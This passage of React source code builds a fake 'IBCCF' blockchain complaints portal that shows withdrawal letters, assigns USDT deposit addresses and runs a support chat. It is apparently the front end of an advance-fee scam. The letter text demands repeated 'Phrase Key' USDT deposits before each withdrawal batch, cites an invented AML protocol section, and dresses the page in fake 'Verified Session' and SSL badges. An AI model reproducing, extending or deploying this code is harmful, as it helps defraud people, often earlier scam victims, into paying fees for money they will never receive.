                Contact IBCCF Support
              </Button>
            </CardContent>
          </Card>
        </main>
      </div>
    );
  }

  // SUCCESS VIEW - Redirects to deposit address chat
  if (viewState === 'success') {
    const ticketId = lastSubmission?.id ? `IBCCF-${String(lastSubmission.id).padStart(6, '0')}` : `IBCCF-${Date.now().toString().slice(-6)}`;
    
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-50 to-blue-50">
        {/* Header */}
        <nav className="bg-primary text-white shadow-lg">
          <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-4">
            <div className="w-10 h-10 rounded-lg bg-white/20 flex items-center justify-center">
              <Shield className="h-6 w-6 text-white" />
            </div>
            <div>
              <h1 className="font-bold">IBCCF SECURE PORTAL</h1>
              <p className="text-xs text-blue-200">Deposit Verification Required</p>
            </div>
          </div>
        </nav>

        <main className="max-w-3xl mx-auto px-4 py-8">
          {/* Success Banner */}
          <motion.div 
            initial={{ opacity: 0, y: -20 }} 
            animate={{ opacity: 1, y: 0 }}
            className="bg-green-50 border-2 border-green-200 rounded-lg p-6 mb-8"
          >
            <div className="flex items-center gap-4">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                <CheckCircle2 className="w-8 h-8 text-green-600" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-green-900">Withdrawal Request Confirmed</h2>
                <p className="text-green-700">Reference: <span className="font-mono font-bold">{ticketId}</span></p>
                <p className="text-sm text-green-600 mt-1">Option {lastSubmission?.selectedOption || selectedOption} selected on {new Date().toLocaleDateString()}</p>
              </div>
            </div>
          </motion.div>

          {/* Deposit Address Section */}
          <motion.div 
            initial={{ opacity: 0, y: 20 }} 
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
          >
            <Card className="border-2 border-amber-200 bg-amber-50 mb-6">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-amber-900">
                  <Wallet className="w-5 h-5" />
                  USDT Deposit Address
                </CardTitle>
              </CardHeader>
              <CardContent>
                {currentCase?.depositAddress ? (
                  <>
                    <div className="bg-white p-4 rounded-lg border-2 border-dashed border-amber-300 mb-4">
                      <p className="text-xs text-slate-500 uppercase tracking-wider mb-2">Your Assigned Deposit Address (TRC20)</p>
                      <div className="flex items-center gap-3">
                        <code className="flex-1 text-lg font-mono font-bold text-slate-900 break-all">
                          {currentCase.depositAddress}
                        </code>
                        <Button
                          variant="outline"
                          size="sm"
                          className="flex-shrink-0 border-amber-400 hover:bg-amber-100"
                          onClick={() => {
                            navigator.clipboard.writeText(currentCase.depositAddress || '');
                            toast({ title: "Copied!", description: "Deposit address copied to clipboard" });
                          }}
                          data-testid="button-copy-deposit-address"
                        >
                          <Copy className="w-4 h-4 mr-1" />
                          Copy
                        </Button>
                      </div>
                    </div>
                    <div className="bg-amber-100 p-4 rounded-lg">
                      <p className="text-amber-900 font-semibold mb-2">Important Instructions:</p>
                      <ul className="text-sm text-amber-800 space-y-1 list-disc list-inside">
                        <li>Transfer the required amount to the address above</li>
                        <li>Only send USDT (TRC20 network)</li>
                        <li>Keep your transaction receipt for verification</li>
                        <li>Contact support after completing the deposit</li>
                      </ul>
                    </div>
                  </>
                ) : (
                  <div className="text-center py-8">
                    <AlertTriangle className="w-12 h-12 mx-auto text-amber-500 mb-4" />
                    <p className="text-amber-900 font-semibold">Deposit Address Pending</p>
                    <p className="text-amber-700 text-sm mt-2">Please contact support to receive your deposit address.</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </motion.div>

          {/* Chat Section */}
          <motion.div 
            initial={{ opacity: 0, y: 20 }} 
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4 }}
          >
            <Card className="border-2 border-blue-200">
              <CardHeader className="bg-blue-50">
                <CardTitle className="flex items-center gap-2 text-blue-900">
                  <MessageCircle className="w-5 h-5" />
                  Deposit Verification Support
                </CardTitle>
              </CardHeader>
              <CardContent className="p-0">
                {/* Embedded Chat */}
                <div className="h-64 overflow-y-auto p-4 space-y-3 bg-slate-50">
                  {chatMessages.length === 0 ? (
                    <div className="text-center text-slate-500 mt-8">
                      <MessageCircle className="h-12 w-12 mx-auto text-slate-300 mb-3" />
                      <p className="text-sm">Start a conversation about your deposit.</p>
                      <p className="text-xs text-slate-400 mt-1">Our team will verify your transaction.</p>
                    </div>
                  ) : (
                    chatMessages.map((msg) => (
                      <div
                        key={msg.id}
                        className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
                      >
                        <div
                          className={`max-w-[80%] px-4 py-2 rounded-2xl ${
                            msg.sender === 'user'
                              ? 'bg-blue-600 text-white rounded-br-md'
                              : 'bg-white text-slate-800 border border-slate-200 rounded-bl-md'
                          }`}
                        >
                          <p className="text-sm whitespace-pre-wrap">{msg.message}</p>
                          <p className={`text-xs mt-1 ${msg.sender === 'user' ? 'text-blue-100' : 'text-slate-400'}`}>
                            {new Date(msg.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                          </p>
                        </div>
                      </div>
                    ))
                  )}
                </div>
                <div className="p-3 border-t border-slate-200 bg-white">
                  <div className="flex gap-2">
                    <Input
                      placeholder="Ask about your deposit..."
                      value={newMessage}
                      onChange={(e) => setNewMessage(e.target.value)}
                      onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && sendMessage()}
                      disabled={isSendingMessage}
                      className="flex-1"
                      data-testid="input-deposit-chat"
                    />
                    <Button
                      onClick={sendMessage}
                      disabled={!newMessage.trim() || isSendingMessage}
                      size="sm"
                      className="bg-blue-600 hover:bg-blue-700"
                      data-testid="button-send-deposit-chat"
                    >
                      <Send className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          </motion.div>

          {/* Navigation */}
          <div className="mt-8 flex gap-4">
            <Button 
              variant="outline" 
              className="flex-1"
              onClick={() => setViewState('dashboard')}
            >
              <Home className="w-4 h-4 mr-2" />
              Back to Dashboard
            </Button>
            <Button 
              className="flex-1"
              onClick={() => setViewState('deposit')}
            >
              <Upload className="w-4 h-4 mr-2" />
              Upload Receipt
            </Button>
          </div>
        </main>
      </div>
    );
  }

  // ACTIVITY TIMELINE VIEW
  if (viewState === 'timeline') {
    // Combine all activities into a single timeline
    const activities = [
      ...submissions.map(s => ({
        id: `submission-${s.id}`,
        type: 'submission' as const,
        title: `Option ${s.selectedOption} Submission`,
        description: `Submitted withdrawal option for ${s.withdrawalAmount}`,
        timestamp: new Date(s.submittedAt),
        icon: 'file',
        color: 'blue'
      })),
      ...depositReceipts.map(r => ({
        id: `receipt-${r.id}`,
        type: 'receipt' as const,
        title: `Deposit Receipt Uploaded`,
        description: `Receipt ${r.status === 'approved' ? 'approved' : r.status === 'rejected' ? 'rejected' : 'pending review'}`,
        timestamp: new Date(r.uploadedAt),
        icon: 'upload',
        color: r.status === 'approved' ? 'green' : r.status === 'rejected' ? 'red' : 'amber'
      })),
      ...adminMessages.map(m => ({
        id: `message-${m.id}`,
        type: 'message' as const,
        title: m.title,
        description: m.body.substring(0, 100) + (m.body.length > 100 ? '...' : ''),
        timestamp: new Date(m.createdAt),
        icon: 'bell',
        color: m.category === 'urgent' ? 'red' : m.category === 'processing' ? 'amber' : 'green'
      }))
    ].sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());

    return (
      <div className="min-h-screen bg-slate-900 p-4 font-sans">
        <div className="max-w-3xl mx-auto">
          <div className="flex items-center gap-3 mb-8">
            <div className="w-10 h-10 rounded-lg bg-[#004182]/20 flex items-center justify-center">
              <Shield className="h-6 w-6 text-[#004182]" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white">Activity Timeline</h1>
              <p className="text-slate-400 text-xs">Your complete account history</p>
            </div>
          </div>

          <Card className="bg-slate-950 border-slate-800 mb-6">
            <CardHeader className="border-b border-slate-800">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Clock className="w-5 h-5 text-indigo-500" />
                  <CardTitle className="text-white text-lg">Recent Activity</CardTitle>
                </div>
                <Badge variant="outline" className="text-slate-400 border-slate-700">
                  {activities.length} events
                </Badge>
              </div>
            </CardHeader>
            <CardContent className="pt-6">
              {activities.length === 0 ? (
                <div className="text-center py-12 text-slate-500">
                  <Clock className="w-12 h-12 mx-auto mb-4 opacity-50" />
                  <p>No activity yet.</p>
                  <p className="text-sm mt-2">Your account activities will appear here.</p>
                </div>
              ) : (
                <div className="relative">
                  {/* Timeline line */}
                  <div className="absolute left-4 top-2 bottom-2 w-0.5 bg-slate-800" />
                  
                  <div className="space-y-6">
                    {activities.map((activity, index) => (
                      <motion.div 
                        key={activity.id}
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                        transition={{ delay: index * 0.1 }}
                        className="relative pl-10"
                        data-testid={`timeline-item-${activity.id}`}
                      >
                        {/* Timeline dot */}
                        <div className={`absolute left-2.5 w-3 h-3 rounded-full ring-4 ring-slate-950 ${
                          activity.color === 'blue' ? 'bg-blue-500' :
                          activity.color === 'green' ? 'bg-green-500' :
                          activity.color === 'red' ? 'bg-red-500' :
                          activity.color === 'amber' ? 'bg-amber-500' : 'bg-slate-500'
                        }`} />
                        
                        <div className="bg-slate-900 border border-slate-800 rounded-lg p-4">
                          <div className="flex items-start justify-between mb-2">
                            <div className="flex items-center gap-2">
                              <div className={`p-1.5 rounded-md ${
                                activity.color === 'blue' ? 'bg-blue-500/20 text-blue-400' :
                                activity.color === 'green' ? 'bg-green-500/20 text-green-400' :
                                activity.color === 'red' ? 'bg-red-500/20 text-red-400' :
                                activity.color === 'amber' ? 'bg-amber-500/20 text-amber-400' : 'bg-slate-500/20 text-slate-400'
                              }`}>
                                {activity.icon === 'file' && <FileText className="w-4 h-4" />}
                                {activity.icon === 'upload' && <Upload className="w-4 h-4" />}
                                {activity.icon === 'bell' && <Bell className="w-4 h-4" />}
                              </div>
                              <span className="text-white font-medium text-sm">{activity.title}</span>
                            </div>
                            <span className="text-xs text-slate-500">
                              {activity.timestamp.toLocaleDateString()} {activity.timestamp.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                            </span>
                          </div>
                          <p className="text-slate-400 text-sm">{activity.description}</p>
                        </div>
                      </motion.div>
                    ))}
                  </div>
                </div>
              )}
            </CardContent>
          </Card>

          <Button variant="outline" className="border-slate-700 text-slate-300" onClick={() => setViewState('dashboard')} data-testid="button-back-dashboard-timeline">
            <ArrowLeft className="w-4 h-4 mr-2" /> Back to Dashboard
          </Button>
        </div>
      </div>
    );
  }

  // SUBMISSIONS FOLDER VIEW
  if (viewState === 'submissions') {
    return (
      <div className="min-h-screen bg-slate-900 p-4 font-sans">
        <div className="max-w-3xl mx-auto">
          <div className="flex items-center gap-3 mb-8">
            <div className="w-10 h-10 rounded-lg bg-[#004182]/20 flex items-center justify-center">
              <Shield className="h-6 w-6 text-[#004182]" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white">Document Archive</h1>
              <p className="text-slate-400 text-xs">Your submission history</p>
            </div>
          </div>

          <Card className="bg-slate-950 border-slate-800 mb-6">
            <CardHeader className="border-b border-slate-800">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <FolderOpen className="w-5 h-5 text-blue-500" />
                  <CardTitle className="text-white text-lg">Your Submissions</CardTitle>
                </div>
                <Badge variant="outline" className="text-slate-400 border-slate-700">
                  {submissions.length} records
                </Badge>
              </div>
            </CardHeader>
            <CardContent className="pt-6">
              {submissions.length === 0 ? (
                <div className="text-center py-12 text-slate-500">
                  <FileText className="w-12 h-12 mx-auto mb-4 opacity-50" />
                  <p>No submissions found.</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {submissions.map((s) => (
                    <div key={s.id} className="bg-slate-900 border border-slate-800 rounded-lg p-4" data-testid={`submission-${s.id}`}>
                      <div className="flex justify-between items-start mb-3">
                        <Badge className={s.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
                          Option {s.selectedOption} Selected
                        </Badge>
                        <span className="text-xs text-slate-500">
                          {new Date(s.submittedAt).toLocaleString()}
                        </span>
                      </div>
                      <div className="grid grid-cols-2 gap-4 text-sm">
                        <div>
                          <span className="text-slate-500 block text-xs mb-1">Withdrawal Amount</span>
                          <span className="text-green-400 font-medium">{s.withdrawalAmount}</span>
                        </div>
                        <div>
                          <span className="text-slate-500 block text-xs mb-1">Total Batches</span>
                          <span className="text-slate-300">{s.withdrawalBatches}</span>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>

          <Button variant="outline" className="border-slate-700 text-slate-300" onClick={() => setViewState('dashboard')} data-testid="button-back-dashboard">
            <ArrowLeft className="w-4 h-4 mr-2" /> Back to Dashboard
          </Button>
        </div>
      </div>
    );
  }

  // LETTER VIEW - Professional IBCCF Design
  
  // Check if letter has been sent by admin
  if (!currentCase?.letterSent) {
    return (
      <div className="min-h-screen bg-slate-100 text-slate-900 font-sans flex items-center justify-center p-4">
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }} 
          animate={{ opacity: 1, scale: 1 }}
          className="max-w-md w-full"
        >
          <Card className="bg-white shadow-xl border-slate-200">
            <CardHeader className="text-center pb-2">
              <div className="w-20 h-20 bg-slate-100 rounded-full mx-auto mb-4 flex items-center justify-center">
                <FileText className="w-10 h-10 text-slate-400" />
              </div>
              <CardTitle className="text-xl">Withdrawal Letter Pending</CardTitle>
            </CardHeader>
            <CardContent className="text-center space-y-4">
              <p className="text-slate-600">
                Your personalized withdrawal letter is being prepared by the compliance team and will be available shortly.
              </p>
              <div className="bg-blue-50 border border-blue-100 rounded-lg p-4">
                <p className="text-sm text-blue-700">
                  You will receive a notification when your letter is ready for review.
                </p>
              </div>
              <Button 
                onClick={() => setViewState('dashboard')}
                className="w-full"
                data-testid="button-back-dashboard-pending"
              >
                <ArrowLeft className="w-4 h-4 mr-2" /> Return to Dashboard
              </Button>
            </CardContent>
          </Card>
        </motion.div>
      </div>
    );
  }
  
  const adminData = currentCase ? {
    vipStatus: currentCase.vipStatus,
    username: currentCase.username,
    withdrawalAmount: currentCase.withdrawalAmount,
    withdrawalBatches: currentCase.withdrawalBatches,
    physilocal0: currentCase.physilocal0
  } : undefined;

  const letter = letterContent || {
    headline: "Withdrawal Protocol Selection",
    introduction: `We acknowledge the successful completion of your re-authentication procedure.`,
    bodyContent: `In accordance with IBCCF cross-border withdrawal regulations, please review the finalised withdrawal options for your account.`,
    footerNote: "NEXT ACTION REQUIRED: Please confirm your preferred withdrawal option below.",
    complianceReference: `IBCCF-AML-CC-${currentCase?.accessCode || ''}`,
    optionATitle: "Accelerated Release",
    optionADescription: "Full withdrawal amount processed in accelerated batches.",
    optionAFrequency: "every 12 hours",
    optionAKeyCost: "260.996 USDT",
    optionATotalRequirement: "2,609.96 USDT",
    optionBTitle: "Standard Release",
    optionBDescription: "Half allocation processed in standard batches.",
    optionBFrequency: "every 12 hours",
    optionBKeyCost: "521.993 USDT",
    optionBTotalRequirement: "5,219.92 USDT",
    phraseKeyRequirements: JSON.stringify([
      "Each Phrase Key unlocks exactly one transfer of your withdrawal balance.",
      "A new Phrase Key is required before each scheduled transfer.",
      "Phrase Keys must be acquired using USDT only and deposited to your assigned wallet.",
      "Deposits are tracked automatically and confirmed within 24 hours.",
      "No other tokens, currencies, or payment methods are supported."
    ]),
    complianceNotice: "Per IBCCF Anti-Money Laundering (AML) Protocol Section 7.3: Phrase Key deposits are mandatory for all outbound transfers. Failure to submit keys on schedule will pause your withdrawal and may result in extended compliance review."
  };

  // Parse phrase key requirements
  let phraseKeyRequirements: string[] = [];
  try {
    if (letterContent?.phraseKeyRequirements) {
      phraseKeyRequirements = JSON.parse(letterContent.phraseKeyRequirements);
    } else if (letter.phraseKeyRequirements) {
      phraseKeyRequirements = JSON.parse(letter.phraseKeyRequirements);
    }
  } catch {
    phraseKeyRequirements = [];
  }

  return (
    <div className="min-h-screen bg-slate-100 text-slate-900 font-sans selection:bg-blue-100 print:bg-white">
      {/* Professional Navigation */}
      <nav className="bg-slate-900 text-white shadow-lg print:hidden">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16">
            <div className="flex items-center gap-4">
              <div className="w-10 h-10 rounded-lg bg-white/20 flex items-center justify-center">
                <Shield className="h-6 w-6 text-white" />
              </div>
              <div>
                <div className="text-sm font-bold leading-none">IBCCF COMPLAINTS FORUM</div>
                <div className="text-[10px] text-slate-400 font-medium tracking-wider uppercase">Secure Gateway Portal</div>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <Button 
                variant="ghost" 
                size="sm" 
                className="text-white hover:text-white hover:bg-slate-800"
                onClick={() => setViewState('dashboard')}
                data-testid="button-back-dashboard"
              >
                <ArrowLeft className="w-4 h-4 mr-2" /> Dashboard
              </Button>
              {submissions.length > 0 && (
                <Button 
                  variant="outline" 
                  size="sm" 
                  className="border-slate-600 text-white hover:bg-slate-800"
                  onClick={() => setViewState('submissions')}
                  data-testid="button-view-history"
                >
                  <History className="w-4 h-4 mr-2" /> History ({submissions.length})
                </Button>
              )}
              <Button 
                variant="outline" 
                size="sm" 
                className="border-slate-600 text-white hover:bg-slate-800"
                onClick={() => window.print()}
                data-testid="button-download-pdf"
              >
                <Download className="w-4 h-4 mr-2" /> Download PDF
              </Button>
              <div className="flex items-center gap-2 text-xs text-slate-400">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                Secure Connection
              </div>
            </div>
          </div>
        </div>
      </nav>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8 print:max-w-none print:px-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
          
          {/* Official Letter Document */}
          <div className="bg-white rounded-xl shadow-xl border border-slate-200 overflow-hidden print:shadow-none print:border-none">
            
            {/* Letter Header with Logo */}
            <div className="bg-gradient-to-r from-slate-900 to-slate-800 text-white px-8 py-6">
              <div className="flex items-center gap-4">
                <div className="w-16 h-16 rounded-xl bg-white/20 flex items-center justify-center">
                  <Shield className="h-10 w-10 text-white" />
                </div>
                <div>
                  <h1 className="text-xl font-bold tracking-wide">INTERNATIONAL BLOCKCHAIN COMMUNITY COMPLAINTS FORUM (IBCCF)</h1>
                  <p className="text-slate-300 text-sm uppercase tracking-widest">Account Integrity & Security Operations Division (ISO-D)</p>
                  <p className="text-slate-400 text-xs uppercase tracking-wider">Global Compliance Secretariat</p>
                </div>
              </div>
            </div>

            {/* Verified Session Banner */}
            <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white px-8 py-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center">
                    <CheckCircle2 className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <p className="text-sm font-bold uppercase tracking-wider flex items-center gap-2">
                      Verified Session Active
                      <span className="w-2 h-2 bg-white rounded-full animate-pulse"></span>
                    </p>
                    <p className="text-xs text-green-100">Identity confirmed through re-authentication protocol</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-xs text-green-100">Account Status</p>
                  <span className="text-sm font-bold">{adminData?.vipStatus || "Standard Member"}</span>
                </div>
              </div>
            </div>
            
            {/* Compliance Reference Box */}
            <div className="bg-blue-50 border-b-2 border-blue-200 px-8 py-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center">
                    <ShieldCheck className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <p className="text-xs text-blue-600 font-semibold uppercase tracking-wider">Compliance Clearance Reference</p>
                    <p className="text-lg font-mono font-bold text-blue-900">{letterContent?.complianceReference || letter.complianceReference}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-xs text-slate-500">Session Verified</p>
                  <Badge className="bg-green-600 text-white">
                    <CheckCircle2 className="w-3 h-3 mr-1" />
                    Authenticated
                  </Badge>
                </div>
              </div>
            </div>

            {/* Letter Body */}
            <div className="px-8 py-6">
              <div className="mb-6">
                <p className="text-slate-600 text-sm mb-2">Date: {new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
                <p className="font-bold text-slate-900 text-lg">Dear {currentCase?.userName || "Valued Client"},</p>
              </div>

              <div className="prose prose-slate max-w-none text-slate-700 leading-relaxed mb-8">
                {letter.introduction && (
                  <p className="mb-4">{letter.introduction.replace(/^Dear\s+[^,]+,?\s*/i, '')}</p>
                )}
                {letter.bodyContent && (
                  <p className="mb-4">{letter.bodyContent}</p>
                )}
                {letter.footerNote && (
                  <p className="font-semibold text-slate-900 bg-amber-50 border-l-4 border-amber-500 pl-4 py-2">{letter.footerNote}</p>
                )}
              </div>

              {/* Already Submitted Notice */}
              {submissions.length > 0 ? (
                <motion.div 
                  initial={{ opacity: 0, y: 20 }} 
                  animate={{ opacity: 1, y: 0 }}
                  className="bg-green-50 border-2 border-green-200 rounded-xl p-6 mb-8"
                >
                  <div className="flex items-start gap-4">
                    <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                      <CheckCircle2 className="w-7 h-7 text-green-600" />
                    </div>
                    <div className="flex-1">
                      <h3 className="text-xl font-bold text-green-900 mb-2">Request Submitted Successfully</h3>
                      <p className="text-green-700 mb-4">Your withdrawal request has been submitted and is being processed by the compliance team.</p>
                      
                      <div className="bg-white rounded-lg p-4 border border-green-200 space-y-3 mb-4">
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-600">Reference Number</span>
                          <span className="font-mono font-bold text-green-700">IBCCF-{String(submissions[0]?.id || 0).padStart(6, '0')}</span>
                        </div>
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-600">Status</span>
                          <Badge className="bg-green-600">Submitted</Badge>
                        </div>
                        <div className="flex justify-between text-sm">
                          <span className="text-slate-600">Submitted On</span>
                          <span className="font-medium">{new Date(submissions[0]?.submittedAt || Date.now()).toLocaleString()}</span>
                        </div>
                      </div>
                      
                      <div className="flex gap-3">
                        <Button onClick={() => setViewState('dashboard')} className="bg-green-600 hover:bg-green-700">
                          <ArrowLeft className="w-4 h-4 mr-2" />
                          Return to Dashboard
                        </Button>
                        <Button variant="outline" onClick={() => setViewState('submissions')}>
                          <History className="w-4 h-4 mr-2" />
                          View All History
                        </Button>
                      </div>
                    </div>
                  </div>
                </motion.div>
              ) : currentCase?.submissionUrl ? (
                <>
                  {/* Simplified Submission URL Approach */}
                  <div className="mb-8">
                    <h2 className="text-lg font-bold text-slate-900 mb-4 flex items-center gap-3">
                      <div className="w-1 h-6 bg-blue-600 rounded"></div>
                      Required Action
                    </h2>
                    
                    <motion.div 
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-200 rounded-xl p-6"
                    >
                      <div className="flex items-start gap-4">
                        <div className="w-14 h-14 bg-blue-600 rounded-full flex items-center justify-center flex-shrink-0">
                          <ExternalLink className="w-7 h-7 text-white" />
                        </div>
                        <div className="flex-1">
                          <h3 className="text-xl font-bold text-blue-900 mb-2">Complete Your Submission</h3>
                          <p className="text-blue-700 mb-4">
                            Click the button below to complete your withdrawal request. You will be redirected to a secure form to finalize your submission.
                          </p>
                          
                          <div className="bg-white rounded-lg p-4 border border-blue-200 space-y-3 mb-4">
                            <div className="flex justify-between text-sm">
                              <span className="text-slate-600">Account</span>
                              <span className="font-bold text-slate-900">{currentCase?.userName || "N/A"}</span>
                            </div>
                            <div className="flex justify-between text-sm">
                              <span className="text-slate-600">Withdrawal Amount</span>
                              <span className="font-bold text-green-600">{adminData?.withdrawalAmount || "N/A"}</span>
                            </div>
                            <div className="flex justify-between text-sm">
                              <span className="text-slate-600">Reference</span>
                              <span className="font-mono font-bold text-blue-700">{letterContent?.complianceReference || letter.complianceReference}</span>
                            </div>
                          </div>
                          
                          <Button 
                            size="lg"
                            className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-lg"
                            onClick={async () => {
                              try {
                                const response = await fetch(`/api/cases/${currentCase.id}/submissions`, {
                                  method: 'POST',
                                  headers: { 'Content-Type': 'application/json' },
                                  body: JSON.stringify({ selectedOption: 'URL_SUBMISSION' })
                                });
                                if (response.ok) {
                                  const submission = await response.json();
                                  setLastSubmission(submission);
                                  setSubmissions(prev => [submission, ...prev]);
                                  window.open(currentCase.submissionUrl, '_blank');
                                  toast({
                                    title: "Submission Recorded",
                                    description: "Your request has been tracked. Complete the form in the new tab.",
                                    className: "bg-green-50 border-green-200 text-green-900",
                                  });
                                }
                              } catch (error) {
                                toast({ variant: "destructive", title: "Error", description: "Failed to record submission." });
                              }
                            }}
                            data-testid="button-submit-url"
                          >
                            <ExternalLink className="w-5 h-5 mr-2" />
                            Submit Your Request
                          </Button>
                          
                          <p className="text-xs text-blue-600 text-center mt-3">
                            Opens in a new tab. Your submission will be tracked automatically.
                          </p>
                        </div>
                      </div>
                    </motion.div>
                  </div>
                </>
              ) : (
                <>
                  {/* No submission URL configured - show message */}
                  <div className="mb-8">
                    <motion.div 
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="bg-amber-50 border-2 border-amber-200 rounded-xl p-6"
                    >
                      <div className="flex items-start gap-4">
                        <div className="w-14 h-14 bg-amber-500 rounded-full flex items-center justify-center flex-shrink-0">
                          <Clock className="w-7 h-7 text-white" />
                        </div>
                        <div className="flex-1">
                          <h3 className="text-xl font-bold text-amber-900 mb-2">Awaiting Configuration</h3>
                          <p className="text-amber-700 mb-4">
                            The submission process is being configured by the compliance team. Please check back shortly or contact support for assistance.
                          </p>
                          <Button 
                            onClick={() => setViewState('dashboard')}
                            variant="outline"
                            className="border-amber-300 text-amber-700 hover:bg-amber-100"
                          >
                            <ArrowLeft className="w-4 h-4 mr-2" />
                            Return to Dashboard
                          </Button>
                        </div>
                      </div>
                    </motion.div>
                  </div>
                </>
              )}
            </div>

            {/* Document Footer */}
            <div className="bg-slate-50 border-t border-slate-200 px-8 py-4">
              <div className="flex items-center justify-between text-xs text-slate-500">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4" />
                  <span>256-bit SSL Encrypted • Document ID: {letterContent?.complianceReference || letter.complianceReference}</span>
                </div>
                <span>Generated: {new Date().toISOString()}</span>
              </div>
            </div>
          </div>

        </motion.div>
      </main>

      {/* Confirmation Dialog */}
      <Dialog open={isConfirming} onOpenChange={setIsConfirming}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-primary">Confirm Selection</DialogTitle>
            <DialogDescription>
              You are about to initiate the withdrawal schedule for {adminData?.username}.
            </DialogDescription>
          </DialogHeader>
          <div className="py-4">
            <div className="bg-slate-50 rounded-lg p-4 space-y-2">
              <div className="flex justify-between">
                <span className="text-slate-500">Selected Option</span>
                <Badge className={selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>Option {selectedOption}</Badge>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Amount</span>
                <span className="font-medium">{adminData?.withdrawalAmount}</span>
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>Cancel</Button>
            <Button onClick={handleSubmit} disabled={isSubmitting} className="gap-2" data-testid="button-confirm-submit">
              {isSubmitting ? "Transmitting..." : "Submit Selection"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

    </div>
  );
}
